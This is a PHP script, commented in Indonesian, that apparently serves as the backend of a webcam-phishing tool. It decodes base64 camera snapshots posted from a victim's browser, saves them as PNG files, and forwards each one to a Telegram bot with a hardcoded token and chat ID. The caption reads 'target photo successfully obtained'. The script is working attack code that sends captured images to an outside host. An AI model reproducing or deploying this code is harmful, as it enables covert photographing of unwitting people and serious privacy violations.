<?php
// 1. Cek apakah ada data 'cat' yang dikirim melalui POST
if (!empty($_POST['cat'])) {
    
    // Pembuatan timestamp untuk penamaan file unik
    $date = date('dMYHis');
    $imageData = $_POST['cat'];

    // Membuat log penerimaan data lokal
    error_log("Received\r\n", 3, "Log.log");

    // 2. Filter string untuk membuang header data URL base64
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    
    // 3. Dekode string base64 menjadi biner gambar asli
    $unencodedData = base64_decode($filteredData);
    
    // 4. Tentukan lokasi folder dan nama file gambar
    $imagePath = './images/cam' . $date . '.png';
    
    $fp = fopen($imagePath, 'wb');
    if ($fp) {
        fwrite($fp, $unencodedData);
        fclose($fp);
        
        // --- PROSES PENGIRIMAN KE TELEGRAM ---
        // Ganti dengan Token Bot dan Chat ID Anda sendiri
        $botToken = "8723217533:AAH0-PhgEwjiiv1cZ5uA0K0w_oG_MBXcjQw"; 
        $chatId   = "8039919095";    

        // Membuat objek file menggunakan CURLFile agar aman & kompatibel di PHP baru
        $cfile = new CURLFile(realpath($imagePath), 'image/png', basename($imagePath));

        $data = [
            'chat_id' => $chatId,
            'photo'   => $cfile,
            'caption' => "📸 Foto target berhasil didapatkan!"
        ];

        // Inisialisasi cURL untuk request ke Telegram Bot API
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendPhoto");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        // Eksekusi pengiriman
        $response = curl_exec($ch);
        curl_close($ch);
    }
}

exit();
?>
